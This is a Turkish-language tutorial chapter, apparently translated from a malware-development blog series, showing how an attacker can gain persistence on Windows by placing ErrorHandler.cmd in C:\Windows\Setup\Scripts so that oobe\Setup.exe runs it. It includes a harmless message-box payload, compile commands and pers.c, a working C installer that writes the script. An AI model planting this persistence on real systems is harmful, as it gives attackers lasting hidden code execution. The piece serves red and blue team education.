\newpage
\subsection{88. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 22. Windows Kurulumu. Basit C++ örneği.}

﷽

![pers](./images/104/2023-07-17_00-13.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılık sağlamak için kullanılabilecek en ilginç yöntemlerden biri olan **Windows Kurulum betiği** yöntemine dayanmaktadır.    

### kurulum betiği

`C:\WINDOWS\system32\oobe\Setup.exe`, Windows işletim sisteminde bulunan bir çalıştırılabilir dosyaydır. `oobe` dizini, *"Out Of Box Experience"* (Kutudan Çıkma Deneyimi) anlamına gelir ve Windows'un ilk kurulumu sırasında kullanıcıların hesap oluşturma, tercihleri ayarlama, varsayılan ayarları seçme gibi adımları tamamlamasını sağlar.    

![pers](./images/104/2023-07-16_22-58.png){width="80%"}    

Görünüyor ki, eğer zararlı yüklenici dosyanızı `c:\WINDOWS\Setup\Scripts\ErrorHandler.cmd` konumuna yerleştirirseniz, `c:\WINDOWS\system32\oobe\Setup.exe` bir hata meydana geldiğinde bunu yükleyecektir.     

### pratik örnek

Haydi pratik bir örneğe bakalım. Öncelikle, her zamanki gibi, "kötü" uygulamamızı oluşturalım. Basitlik açısından, yine `meow-meow` mesaj kutusu "kötü amaçlı yazılımı" kullanıyoruz (`hack.c`):  

```cpp
/*
hack.c
windows kalıcılık için kötü uygulama
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ardından, kalıcılık için `ErrorHandler.cmd` dosyasını oluşturalım:      

```powershell
@echo off
"C:\Users\user\Desktop\research\2023-07-16-malware-pers-22\hack.exe"
```

Görebildiğiniz gibi, mantık oldukça basit.    

### demo

Haydi her şeyi adım adım inceleyelim. Öncelikle, "kötü amaçlı yazılımımızı" derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/104/2023-07-16_23-47.png){width="80%"}    

Ardından, `ErrorHandler.cmd` dosyamızı `C:\Windows\Setup\Scripts\` klasörüne taşıyalım:     

![pers](./images/104/2023-07-17_00-10.png){width="80%"}    

Tamam, sonraki adımda, `Setup.exe` dosyasını bir hata ile çalıştırmamız gerekiyor. En basit yöntem, `Setup.exe` dosyasını herhangi bir argüman olmadan çalıştırmaktır:     

```powershell
.\Setup.exe
```

![pers](./images/104/2023-07-17_00-13_1.png){width="80%"}    

Eğer `Process Hacker`ı açar ve `hack.exe` dosyasının özelliklerine bakarsak:     

![pers](./images/104/2023-07-17_01-52.png){width="80%"}    

Ana sürecin `cmd.exe (7264)` olduğunu fark edebiliriz,       

![pers](./images/104/2023-07-17_01-53.png){width="80%"}    

Bunun ana süreci ise `Setup.exe (4876)` olarak görünmektedir:     

![pers](./images/104/2023-07-17_01-53_1.png){width="80%"}    

Gördüğünüz gibi, kalıcılık mantığımız mükemmel çalışıyor! =^..^=

### pratik örnek 2. kalıcılık betiği

Deneyin tamamlanması adına `pers.c` dosyasını oluşturdum:     

```cpp
/*
pers.c
Windows Kurulumu üzerinden kalıcılık
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  // klasörü oluştur (eğer yoksa)
  if (!CreateDirectory("C:\\WINDOWS\\Setup\\Scripts", NULL)) {
    DWORD error = GetLastError();
    if (error != ERROR_ALREADY_EXISTS) {
      printf("Dizin oluşturulamadı. Hata: %lu\n", error);
      return -1;
    }
  }

  // dosyayı yazmak için aç
  HANDLE hFile = CreateFile("C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd", 
  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("ErrorHandler dosyası oluşturulamadı. Hata: %lu\n", GetLastError());
    return -1;
  }

  // dosyaya yazılacak içerik
  const char* data = "@echo 
off\n\"C:\\Users\\user\\Desktop\\research\\2023-07-16-malware-pers-22\\hack.exe\"";

  // içeriği dosyaya yaz
  DWORD bytesWritten;
  if (!WriteFile(hFile, data, strlen(data), &bytesWritten, NULL)) {
    printf("ErrorHandler dosyasına yazılamadı. Hata: %lu\n", 
    GetLastError());
  }

  // dosya tanımlayıcısını kapat
  CloseHandle(hFile);
  return 0;
}
```

Bu programın **yönetici yetkileriyle** çalıştırılması gerektiğini unutmayın. Çünkü `C:\\WINDOWS` altında bir dizin ve dosya oluşturmaya çalıştığından, bunun için **yönetici ayrıcalıkları** gerekmektedir.     

![pers](./images/104/2023-07-17_02-12.png){width="80%"}    

### demo 2

Haydi her şeyi adım adım inceleyelim. Kalıcılık betiğimizi derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/104/2023-07-17_02-07.png){width="80%"}    

Ardından, hedef makinede **yönetici yetkileriyle** çalıştıralım:     

```powershell
.\pers.exe
```

![pers](./images/104/2023-07-17_02-13.png){width="80%"}    

Benim durumumda, çalıştırmadan önce bu klasörü sildim:    

![pers](./images/104/2023-07-17_02-10.png){width="80%"}    

Ardından, `Setup.exe`'yi tekrar çalıştıralım:    

![pers](./images/104/2023-07-17_02-15.png){width="80%"}    

![pers](./images/104/2023-07-17_02-15_1.png){width="80%"}    

Mükemmel! =^..^=    

### sonuç

Bu, bir yükleyici paket için yaygın bir dosya adıdır. Bu durumda, Windows'un kurulum ve başlatma sürecinin bir parçasıdır. 
Işletim sistemi kurulumu sırasında ve özellikleri veya bileşenleri eklerken ya da değiştirirken kullanılır.     

Ancak, görebildiğiniz gibi, Windows işletim sisteminin meşru bir parçası olmasına rağmen, kötü amaçlı programlar bazen kendilerini `Setup.exe` olarak adlandırarak algılanmaktan kaçabilirler.      

Ayrıca, `c:\WINDOWS\system32\oobe\` klasörü içerisinde başka dosyalar da vardır:      

![pers](./images/104/2023-07-16_22-59.png){width="80%"}    

Bunları kontrol etmedim.     

Bu yöntem daha önce [hexacorn](https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/) tarafından araştırılmıştır:

![pers](./images/104/2023-07-17_02-26.png){width="80%"}    

Ben sadece C dilinde basit bir PoC kodunu (`pers.c`) gösterdim.     

Umarım bu gönderi, mavi takım üyelerinin bu teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.      

[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/](https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/)      
[https://twitter.com/Hexacorn/status/1482484486994640896](https://twitter.com/Hexacorn/status/1482484486994640896)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-07-16-malware-pers-22)     
